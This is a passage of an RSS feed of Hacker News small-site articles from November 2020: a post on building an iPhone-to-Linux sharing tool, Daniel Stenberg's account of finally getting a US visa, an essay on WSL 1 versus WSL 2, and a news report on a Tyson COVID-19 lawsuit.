<p>The result ended up surprisingly useful, we made it open-source, you can find the <a href="https://github.com/roznet/remotestash">working code here</a> and the <a href="https://apps.apple.com/us/app/remotestash/id1516090251?ls=1">app on the store</a>. As we learned a few new technologies along the way, we decided to write about the approach as hopefully it could be useful to other.</p>



<p>In this first part, weâ€™ll go over the overall approach, then the iPhone Application implementation and finally the python implementation on the computer.</p>



<h2>The Philosophy</h2>



<p>My sonâ€™s philosophy being â€œanything beyond using a <a href="https://en.wikipedia.org/wiki/Network_socket">socket API</a> and crafting your own network packets would be too high levelâ€, he started writing some <a href="https://en.wikipedia.org/wiki/C_(programming_language)">C code</a>, building his own protocol, communicating with a cloud server he rents on <a href="https://www.digitalocean.com/">Digital Ocean</a> with his weekly allowance.</p>



<p>I wanted to take the opportunity to show him how to leverage higher level libraries even languages like python to get the desired result quickly. We targeted to get a proof of concept, including learning the require component within one week-end. No choice but to leverage existing frameworksâ€¦</p>



<p>The philosophy of the tool would be on the phone to be as user friendly and natively integrated to the phone system as possible. On the computer it would be natural for a linux geek, command line based and loosely inspired by some of the <code>git</code> concept of <code>pull</code>, <code>push</code> and <code>stash</code>. No fancy UI and definitely no mouse. Using the mouse is probably more of an heresy for my son that using a high-level library. He lives in the terminal, emacs and the i3 tile window manager. We would also try to be as generic as possible on the items that could be shared, images, text, files, but start with the basic he needed: text, url and photos.</p>



<h2>The Approach</h2>



<p>We needed to decide on three core components: how to store and track the items to be shared â€“ the stash, how the devices would discover each other on the network and how to share the actual items on the network across devices</p>



<h3>stash</h3>



<p>We needed to keep that simple. No database or anything complex, we went for a linux like approach of keeping a dot directory in the home of the user where the supporting files would be kept as well as the actual items themselves saved as files.</p>



<h3>discovery</h3>



<p>The gold standard for service discovery seems to be <a href="https://en.wikipedia.org/wiki/Zero-configuration_networking#Apple_Bonjour">Bonjour or ZeroConf</a>. It appears to have started as an Apple technology, but is a standard used by most device these days. A quick review of the docs showed that it was exactly what we needed. Enables discovery of devices services on the network and we should share small payload of information as well. And of course it was multi-platform with convenient library in the Apple iOS development environment and python.</p>



<h3>Sharing</h3>



<p>The most obvious approach to share files between devices seem to be using http/https. Widely supported, easy to debug with many existing tools and of course it supports all kind of format that we needed. python and iOS have great support to do requests and good libraries to implement simple servers. One issue was that on iOS, an app needs to use the https protocol, but a quick search lead to a great little library to implement a server that supports https on iPhone called <a href="https://criollo.io/">Criollo.</a></p>



<h2>Last Missing Pieces</h2>



<p>Before we could really start, two major pieces remained to be agreed: the name and the icon!</p>



<p>Again two philosophies and two contenders for the name. The teen cool factor approach: <code>Galactic Clipboard</code> or the middle-age practical and plain one: <code>Remote Stash</code>. Because I was quicker to create the GitHub repo and I control our Apple Developer account for the App, I won with <a href="https://github.com/roznet/remotestash">RemoteStash</a>â€¦</p>



<p>The Icon was less contentious. Turns out a teen living in an emacs and terminal environment is less interested in icons, so I quickly put one together</p>



<div><figure><img loading="lazy" width="150" height="150" src="https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x-150x150.png?resize=150%2C150&amp;ssl=1" alt="" srcset="https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=150%2C150&amp;ssl=1 150w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=300%2C300&amp;ssl=1 300w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=1024%2C1024&amp;ssl=1 1024w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=768%2C768&amp;ssl=1 768w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=1536%2C1536&amp;ssl=1 1536w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=2048&amp;ssl=1 2048w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=1168&amp;ssl=1 1168w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=1752&amp;ssl=1 1752w" sizes="(max-width: 150px) 100vw, 150px" data-recalc-dims="1"></figure></div>



<p>Next weâ€™ll look how we implemented the iPhone app before looking at the python script</p>



<p>But first you can see a video demo of the tool</p>



<figure><p><span><iframe width="584" height="329" src="https://www.youtube.com/embed/HmIlISPwmMs?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p></figure>
			</div></div>]]>
            </description>
            <link>https://ro-z.net/blog/ios-development/how-to-airdrop-to-linux-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154508</guid>
            <pubDate>Thu, 19 Nov 2020 21:20:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Daniel Stenberg Is Finally Granted a US Visa]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25154334">thread link</a>) | @andrewnicolalde
<br/>
November 19, 2020 | https://daniel.haxx.se/us-visa.html#got-it | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/us-visa.html#got-it">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p> Time it took for Daniel to get a US visa </p>
<p><span>
 937 days
</span></p><p> Background </p>
<p>
 On June 26th 2017, Daniel was denied to travel to the US - while still having
 a valid ESTA and passport. He was then denied ESTA on April 3, 2018. When
 subsequently applying for a visa instead, there has been no response for over
 two years. (To <i>visit</i>, not to apply for permanent residency.)
</p><p> This page was edited with <a href="#got-it">new content</a> on:
 <b>November 9, 2020</b>
</p><p> Blog posts </p>
<p> First blog post: <a href="https://daniel.haxx.se/blog/2018/07/28/administrative-purgatory/">Administrative

 purgatory</a>
</p><p> The one year anniversary: <a href="https://daniel.haxx.se/blog/2019/04/17/one-year-in-still-no-visa/">One

year in still no visa</a>.
</p><p> <a href="https://daniel.haxx.se/blog/2020/04/17/two-years-in/">Two years in</a>

</p><p> Q&amp;A </p>
<p>
<a href="#got-it">Visa approved</a>
</p><div>
<p>
 937 days since my application, I have a visa in my passport. Valid for 10 years.
</p><p> As an unexpected bonus, there's also a 30 days "NIE" (National Interest
 Exception) that allows me a single entry to the US during "PP" (Presidential
 Proclamations) - which is restricting travels to the US from the European
 Schengen zone.
</p></div>
<p>
<a href="#parcel">"There's a package being delivered to you"</a>
</p><div>
<p>
 934 days into the process (10:30 November 6, 2020) I received this
 text on my phone, saying there's a parcel sent to me from "the
 Embassy of the United State".
</p><p>
<img src="https://daniel.haxx.se/media/embassy-text.png" width="600">
</p></div>
<p>
<a href="#send-in">Please send in your passport</a>
</p><div>
<p> On October 13, 2020 (910 days in), the embassy emailed me again,
asking me to "Please send in your passport for further processing."
</p><p> On October 16, I mailed it to the embassy.
</p></div>
<p>
<a href="#plans">Updated travel plans please!</a>
</p><div>
<p> On September 22, 2020 (889 days in), the US Embassy emailed me, and I will
quote verbatim from the email below.
</p><pre>Dear Sir,
&nbsp;
Your visa application is still in administrative processing. However, we regret to
inform you that because you have missed your travel plans, we will require updated
travel plans from you. If you intend to proceed with your visa application, we
therefore ask you to kindly send your updated travel plans, including any relevant
supporting documents (such as  an official invitation letter and financial support
letter/other financial supporting documents). Thank you.
</pre>
<p> So I need to provide updated plans and "invitation letters"...
</p><p> It seems reasonable to suspect that the embassy woke up and realized this
 after having being prodded by the <a href="#officials">congressman's
 email</a> a few days ago. The travel plans have been outdated for the last
 800 days or so and they only email to ask this now?
</p><p> On October 2, 220 (898 days in) I responded to the email with an
 invitation letter with an offer to visit my colleagues at wolfSSL in the US
 at two different future dates (one in December 2020, one in March 2021) and
 "All expenses, hotel, airfare, transportation and food will be paid for him".
 Signed by Larry Stefonic, CEO of wolfSSL.
</p></div>
<p>
<a href="#long">Do you know why this takes so long?</a>
</p><div>
<p> No. They've just informed me "someone is working on it" and that it "may
take a long time" but without qualifying what that means. They call it
"administrative processing."
</p><p> I have talked to several persons who've experienced similar situations, and
  I have learned about waiting times up to 20 months until a definite "no". I used
  to think of that as a sort of "worst case" waiting time. Now we know it can
  take longer...
</p></div>
<p>
<a href="#esta">Why don't you just apply for an ESTA?</a>
</p><p>
  I already did and they denied me that. See one of the <a href="#images">images below</a>.
</p>
<p>
Why did they deny you ESTA?
</p><p>
  I don't know as they won't tell. And I also don't know why they can't respond to my visa application.
</p>
<p>
<a href="#working">So, someone is working on it?</a>
</p><p>
  Allegedly, yes. I'm sure that person must be working very hard...
</p>
<p>
<a href="#eventually">Do you think they will grant you a visa eventually?</a>
</p><div>
<p>
  No. I have been in contact with many people who have been in similar
  situations such as this, as well as many people who have applied for visas
  for very complicated matters, and it is basically unheard of that it would
  take this long time and still end up with a positive response in the end.
</p><p>
  Someone emailed me and explained how they got their visa approved after 10
  months waiting - so it obviously <i>can</i> happen after a fairly
  long time!
</p></div>
<p>
<a name="#arab">Did you travel to any arab countries, middle-east, North Korea, Sudan, Iran or Iraq?</a>
</p><p>
 No.
</p>
<p>
<a name="#ever">Did you ever visit the US?</a>
</p><div>
<p> Yes, I have visted the US around a dozen times over a time period of almost
 twenty years. I have applied and gotten ESTA permissions several times. I have
 many friends living and working in the US.
</p><p> My latest visit to the US was in December 2016 - using the same ESTA and
 passport I subsequently wanted to use in the summer of 2017 when I was first
 denied travelling to the US.
</p></div>
<p>
<a href="#blocked">How many trips have this blocked you from taking so far?</a>
</p><div>
<p> I have been invited personally to several meetings in the US that I couldn't
 attend. (excluding IETF, HTTPbis or QUIC meetings)
</p><ol>
<li> San Francisco June 2017. Mozilla All Hands.
</li><li> San Francisco June 2018. Mozilla All hands.
</li><li> San Francisco October 2018. Conference speaking engagement.
</li><li> Orlando, Florida December 2018. Mozilla All hands.
</li><li> Portland, Oregon January 2019. Conference speaking engagement.
</li><li> California, March 2019. Conference speaking engagement.
</li><li> Summer of 2019. Wedding.
</li></ol>
</div>
<p>
<a href="#employer">Can't your employer help you?</a>
</p><p> We've already tried all available ways to get information or otherwise
bring this effort forward. To no avail.
</p>
<p>
<a href="#Mozilla">Will Mozilla move more meetings outside of the US?</a>
</p><p> Yes. Several of the coming All hands are now planned and scheduled to
happen outside of the US, for example in Canada and Germany. But I will not be
there to experience them since I quit Mozilla in December 2018.
</p>
<p>
Will your visa situation change when you've quit Mozilla?
</p><p> Unfortunately, there is no reason to suspect or hope so.
</p>
<p>
<a href="#lost">Maybe they lost your application?</a>
</p><div>
<p> I emailed them in July 2019 just to make sure they just hadn't
 forgot about my case or similar over the past year, and I received their
 reply on August 1st 2019. The response said "I have forwarded your email to
 my supervisor to highlight the problem."  - but then nothing more came.
</p><p> I emailed them again on January 28, 2020.<br>
<img src="https://daniel.haxx.se/media/651-days-email.png">
</p><p>
 They responded very politely:
 </p><pre>Dear Sir,
&nbsp;
All applications are processed in the most expeditious manner
possible. While we understand your frustration, we are required to follow
immigration law regarding visa issuances. This process cannot be expedited or
circumvented. Rest assured that we will contact you as soon as the
administrative processing is concluded.
</pre>
</div>
<p>
<a href="#likely">What do you think is the most likely explanation for this treatment?</a>
</p><div>
<p> I think one of the likelier explantions is that someone somewhere has
 found my name and my code used in some evil or malicious manner and drawn the
 wrong conclusions about how my code ended up there or how I could've been
 involved. Like for example in some malware, virus or other attack software. I
 make tools and code available for free and openly and sometimes those are
 unfortunately used in ways I don't condone.
</p><p> Since they won't tell me why, basically all theories are equally likely.
 We just won't know.
</p></div>
<p>
Any other plausible explanations?
</p><div>
<p> People have mentioned my domain name <b>haxx.se</b> or suggested it is
because I have referred to myself as "a hacker" at times. I find that unlikely
since I used the domain and used the term for decades before this.
</p><p> Others have offered the explanation that the immigration authorities
might've decided that I violated the ESTA rules in a previous visit. I can of
course not know what they think, but I have not violated those rules.
</p></div>
<p>
<a href="#crime">Convicted of a crime?</a>
</p><p>
No, I have never been convicted of a crime in Sweden and not anywhere
else. Not even charged. Nor have I ever been involved in a lawsuit of any
kind.
</p>
<p>
<a href="#license">Can you change the curl license?</a>
</p><div><p>
Lots of people suggest this, most probably in jest, but let me be perfectly
clear: no I won't change the curl license.
</p><ol>
 <li> excluding a specific user would make a license to not be open source anymore
 </li><li> curl has many more copyrights than mine, it would be hard
 </li><li> curl is bigger than me personally, I wouldn't do it anyway
</li></ol>
</div>
<p>
<a href="#covid">But Covid-19?</a>
</p><p>
During the Corona pandemic (starting in spring 2020), the US has closed its
borders for a lot of more people who otherwise would have been allowed
entry. I suspect the visa processing has slowed down during this period since
people can't go there anyway. But I have not been notified about anything and
I still expect to get a rejection at some point. Pandemic or not.
</p>
<p>
<a href="#officials">Have you contacted any US officials?</a>
</p><div><p>
A US citizen friend of mine sent the following text in an email to the
U.S. Congressman Gerry Connolly on September 3, 2020.
</p><pre>Dear Representative Gerry Connolly:
&nbsp;
Could you please help my friend Daniel Stenberg *finally* gain permission to
travel to the US? He has been denied permission to travel to the US for years,
yet there is no cause for it.
&nbsp;
On June 26, 2017, Mr. Stenberg was denied to travel to the US, even though he
had a valid ESTA and passport. He was then denied ESTA on April 3, 2018. He
then applied for a visa in April 2018, and has *still* not heard anything.
&nbsp;
This is especially galling because is a widely-known leader in the computer
community. He developed and maintains the "curl" program, a program used
worldwide by many software developers and computer system administrators. In
October 2017 he won the "Polhem prize" for his work on curl; in that ceremony
the Swedish king personally handed Daniel a gold medal. In February 2019 he
joined wolfSSL, an American company (he's their only Swedish hire), and yet
he's still not allowed to travel to the US.
&nbsp;
Perhaps there is a confusion about the word "hacker". In the computer
community, a "hacker" is NOT someone who breaks into computers, a hacker
is "a person who delights in having an intimate understanding of the
internal workings of a system, computers and computer networks in
particular."  ( IETF RFC 1983, https://tools.ietf.org/html/rfc1983).

Mr. Stenberg does *not* break into computers without authorization.
&nbsp;
At the least, the State Department should have asked questions instead of
reflexively denying entry to a world leader in the computer industry.
&nbsp;
More information is available on his personal website:
https://daniel.haxx.se/us-visa.html
</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daniel.haxx.se/us-visa.html#got-it">https://daniel.haxx.se/us-visa.html#got-it</a></em></p>]]>
            </description>
            <link>https://daniel.haxx.se/us-visa.html#got-it</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154334</guid>
            <pubDate>Thu, 19 Nov 2020 21:04:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Windows Subsystem for Linux: The lost potential]]>
            </title>
            <description>
<![CDATA[
Score 297 | Comments 190 (<a href="https://news.ycombinator.com/item?id=25154300">thread link</a>) | @r0sk
<br/>
November 19, 2020 | https://jmmv.dev/2020/11/wsl-lost-potential.html | <a href="https://web.archive.org/web/*/https://jmmv.dev/2020/11/wsl-lost-potential.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              
              <article><p>If you have followed Windows 10 at all during the last few years, you know that the <strong>Windows Subsystem for Linux</strong>, or <strong>WSL</strong> for short, is <em>the</em> hot topic among developers. You can finally run your Linux tooling on Windows as a first class citizen, which means you no longer have to learn PowerShell or, god forbid, suffer through the ancient <code>CMD.EXE</code> console.</p>
<p>Unfortunately, not everything is as rosy as it sounds. I now have to do development <em>on</em> Windows <em>for</em> Windows as part of my new role within Azureâ€¦ and the fact that WSL continues to be separate from the native Windows environment shows. Even though I was quite hopeful, I cannot use WSL as my daily driver because I need to interact with â€œnativeâ€ Windows tooling.</p>
<p>I believe things neednâ€™t be this way, but with the recent push for WSL 2, I think that the potential of an alternate world is now gone. But what do I mean with this? For that, we must first understand the differences between WSL 1 and WSL 2 and how the push for WSL 2 may shut some interesting paths.</p>
<p><strong>DISCLAIMER:</strong> I have zero insight on whatâ€™s going on within the WSL team or what their future plans are. This is purely my personal opinion based on what I have experienced as a user.</p>

<p>Letâ€™s first take a look at WSL 1, and for that, we must look at whatâ€™s in the awkward name. Why was this feature named Windows subsystemâ€¦ <em>for</em> Linux? Isnâ€™t that backwards? This is not a subsystem in Linux to do anything Windows-related; itâ€™s the other way around!</p>
<p>Wellâ€¦ you see, the name is technically correct when considering the design of the Windows NT kernel. From the <a href="https://en.wikipedia.org/wiki/Architecture_of_Windows_NT">Architecture of Windows NT</a> page in the Wikipedia, we find (emphasis mine):</p>
<blockquote>
<p>User mode in Windows NT is made of subsystems capable of passing I/O requests to the appropriate kernel mode device drivers by using the I/O manager. <strong>The user mode layer of Windows NT is made up of the â€œEnvironment subsystemsâ€, which run applications written for many different types of operating systems</strong>, and the â€œIntegral subsystemâ€, which operates system-specific functions on behalf of environment subsystems. The kernel mode stops user mode services and applications from accessing critical areas of the operating system that they should not have access to.</p>
</blockquote>
<p>Windows NT was designed from the ground up to support running processes from a multitude of operating systems, and Win32 was â€œjustâ€ one of those environment subsystems. With these solid foundations, WSL 1 supplies a new environment subsystem, the Linux subsystem, to run Linux binaries atop the Windows NT kernel. Both the Win32 and Linux environment subsystems share the common integral subsystem.</p>
<p>Mumble jumbo. What does any of that actually mean?</p>
<p>Different system call â€œfront-endsâ€â€”thatâ€™s what it means. A user-space process is a collection of binary instructions that the processor executes uninterruptedly (leaving interrupts aside). The operating systemâ€™s kernel is unaware of what the process is doing until the process issues a system call: at that point, the kernel regains control to perform an operation on behalf of the user, which can be something like reading a file or pausing for a few seconds.</p>
<p>The way a process issues system calls, and the semantics of those system calls, are specific to the operating system. For example, on old x86: opening a file on Win32 is system call number <code>17h</code> invoked via <code>INT 2Eh</code> whereas opening a file on Linux is system call number <code>5h</code> invoked via <code>INT 80h</code>.</p>
<p>Butâ€¦ conceptually, opening a file is opening a file, right? The fact that the system call numbers or the software interrupt numbers are different among them is not particularly interesting. And hereby lies the key design aspect of WSL 1: the Linux subsystem in the NT kernel is, simply put, an implementation of Linuxâ€™s system call layer in front of the NT kernel. These system calls later delegate to NT primitives, <em>not</em> Win32 calls. Which is important to repeat: there is no translation from Linux to Win32 system calls.</p>
<p>This is a feat of engineering considering how generally good support for Linux apps got to be under WSL 1 and the many ways in which NT internally differs from Unix, <code>fork+exec</code> being the eternal archenemy.</p>
<p>The true beauty of this design is that there is a single kernel running on the machine, and this kernel has a holistic view of all the processes beneath it. The kernel knows everything about the Win32 <em>and</em> Linux processes. And these processes all interact with unified resources, such a single networking stack, a single memory manager, and a single process scheduler.</p>

<p>If WSL 1 is so cool, then why does WSL 2 exist? Two reasons:</p>
<ul>
<li>WSL 1 has to, essentially, implement all of Linuxâ€™s kernel ABI, â€œbit by bitâ€. If there is a bug in that interface, the WSL 1 has to replicate it. And if there is a feature that is difficult to represent within the NT kernel, either the feature cannot be implemented or it needs extra kernel logic (and thus becomes slower).</li>
<li>Linux subsystem in WSL 1 has to abide by any â€œlimitationsâ€ and inherent differences that exist between the NT kernel and the traditional Unix design. The most obvious one is the NTFS file system and its semantics, and how these differences harm performance of Linux binaries. Poor file system performance seems to be a common complaint in WSL 1.</li>
</ul>
<p>WSL 2 â€œthrows awayâ€ all of the Linux subsystem parts of the name and replaces everything with a full-blown (but very well-hidden and fast) virtual machine. The virtual machine then runs a proper Linux kernel, a proper Linux file system, and a proper Linux networking stack within it.</p>
<p>What this means is that the beauty of the WSL 1 design is gone: the Windows NT kernel doesnâ€™t get to see anything that happens within the Linux world any more. All it knows is that there is a big black box that does â€œstuffâ€ inside, and all it gets to see are the <code>VMENTER</code> and <code>VMEXIT</code> hook points for virtual machines and block-level read/write requests on a virtual disk. The NT kernel is now unaware of Linux processes and file accesses. Similarly, the Linux kernel is unaware of anything in NT land.</p>
<p>You can read about some more differences in the <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions">official documentation</a>.</p>

<p>From the userâ€™s point of view, WSL 2 feels strictly better: Linux apps now run much, much faster because they are not subject to awkward Linux system call â€œemulationâ€ within the NT kernel. If using NTFS with Linux semantics is difficult, thatâ€™s no problem because the Linux environment now uses ext4 on a virtual disk. And support for Linux apps can be much more complete, because, well, WSL 2 <em>is</em> Linux: if you want FUSE, to name something, you got it.</p>
<p>But this comes at the cost <em>of what WSL could have been</em>:</p>
<ul>
<li>Can you imagine how cool it would be if you could type <code>ps</code> or <code>top</code> within a WSL session and see Linux <em>and</em> Windows processes side-by-side, able to mutate their state with <code>kill</code>?</li>
<li>Can you imagine how cool it would be to manipulate Windows services from the WSL session?</li>
<li>Can you imagine how cool it would be if you could use <code>ifconfig</code> (wait, is that <code>ip</code>? ğŸ™„) within a WSL session to inspect and modify the machineâ€™s network interfaces?</li>
<li>Essentially, can you imagine doing all of your Windows system administration tasks from within WSL?</li>
</ul>
<p>Although this never existed, I can well imagine such a worldâ€¦ and itâ€™s one that <em>only the WSL 1 design can provide</em>. And the reason I can imagine this is because macOS gives you this model (albeit cheating because macOS is essentially Unix).</p>
<p>Which is what brings me to my frustration: even though I could install WSL on my development machine for Azure, there is nothing I can use it for. I still have to interact with the system via <code>CMD.EXE</code> because I have to deal with Windows-native processes and resources, and because the tooling I have to deal with is Windows-only.</p>
<p>The FAQ for WSL 2 claims that <a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-faq#what-will-happen-to-wsl-1-will-it-be-abandoned">WSL 1 will not be abandoned</a>, and if we abide by Microsoftâ€™s backwards-compatibility guarantee, that may be true. But keeping WSL 1 running is a monumental effort due to the need to keep up with Linux changes. Regardless, I hope that this is the case and that WSL 1 continues to exist. Who knows, maybe the reason WSL 1 stays behind is to pursue this magical world Iâ€™m describing? ğŸ¤”</p>

<p>I canâ€™t finish this post without talking about the various BSDs. The BSDs, always trailing behind Linux and other commercial operating systems, have had binary-level compatibility for ages. The earliest I can find is Linux compatibility in the NetBSD kernel back in 1995. Thatâ€™s 25 years ago, and 21 before WSL 1â€™s first debut.</p>
<p>And, heck, this isnâ€™t limited to Linux. NetBSD has had support to emulate <em>various</em> different operating systems throughout the years. SVR4 support appeared in 1994 and, for a brief stint, <a href="https://man.netbsd.org/NetBSD-5.0/compat_pecoff.8">NetBSD even had support forâ€¦ ğŸ¥â€¦ PE/COFF binaries</a>â€”thatâ€™s right, Win32 binaries. So, in a way, NetBSD implemented the WSL 1 model in reverse: it let you run Win32 binaries atop the NetBSD kernel back in 2002.</p>
</article>
            </div>
          </div><div>
            <div>
              <p><b>Want more posts like this one? Take a moment to subscribe!</b></p>
            </div>
            <div>
              
              <p>
                  <a href="https://twitter.com/intent/follow?original_referer=https%3A%2F%2Fjmmv.dev%2F&amp;screen_name=jmmv">
                    <img src="https://jmmv.dev/images/badges/Twitter_logo_blue_32.png" alt="Follow @jmmv on Twitter">
                  </a>
                </p>
              <p><a href="https://jmmv.dev/feed.xml"><img src="https://jmmv.dev/images/badges/feed-icon-28x28.png" alt="RSS feed"></a></p>
            </div>
          </div><div>
            <div>
              <p><b>Enjoyed this article? Spread the word or join the ongoing discussion!</b></p>
            </div>
            
          </div></div>]]>
            </description>
            <link>https://jmmv.dev/2020/11/wsl-lost-potential.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154300</guid>
            <pubDate>Thu, 19 Nov 2020 21:00:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lawsuit: Tyson managers bet money on how many workers would contract Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25154104">thread link</a>) | @DanBC
<br/>
November 19, 2020 | https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/ | <a href="https://web.archive.org/web/*/https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <div><figure><img width="2016" height="1512" src="https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility.jpg" srcset="https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility.jpg 2016w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-300x225.jpg 300w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-1024x768.jpg 1024w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-768x576.jpg 768w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-1536x1152.jpg 1536w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-80x60.jpg 80w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-265x198.jpg 265w" sizes="(max-width: 2016px) 100vw, 2016px" alt="" title="Workstation Dividers at Tyson Facility"><figcaption>Tyson workers have had plastic dividers separating them on the production line. (Photo provided by Tyson Fresh Meats)</figcaption></figure></div>
        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a â€œwillful and wanton disregard for workplace safety.â€</p>
<p>In a written statement issued Thursday afternoon, Tyson Foodsâ€™ president and chief executive officer, Dean Banks, said: â€œWe are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>â€œWe have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, weâ€™ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>â€œOur top priority is and remains the health and safety of our team members.â€</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant â€” over a third of the facilityâ€™s workforce â€” contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there â€œshook [him] to the core,â€ plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the â€œglorified fluâ€ and told workers not to worry about it because â€œitâ€™s not a big dealâ€ and â€œeveryone is going to get it.â€ On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, â€œWe all have symptoms â€” you have a job to do.â€ After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didnâ€™t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 â€œthank you bonusesâ€ to employees who turned up for every scheduled shift for three months â€” a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it â€œvigorously disputesâ€ the plaintiffsâ€™ claims and has â€œinvested millions of dollars to provide employees with safety and risk-mitigation equipment.â€</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tysonâ€™s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic â€œat the direction of a federal officerâ€ â€” President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez familyâ€™s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had â€œdirectedâ€ Tyson to do anything.</p>
<p>The Waterloo facility is Tysonâ€™s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

        </div></div>]]>
            </description>
            <link>https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154104</guid>
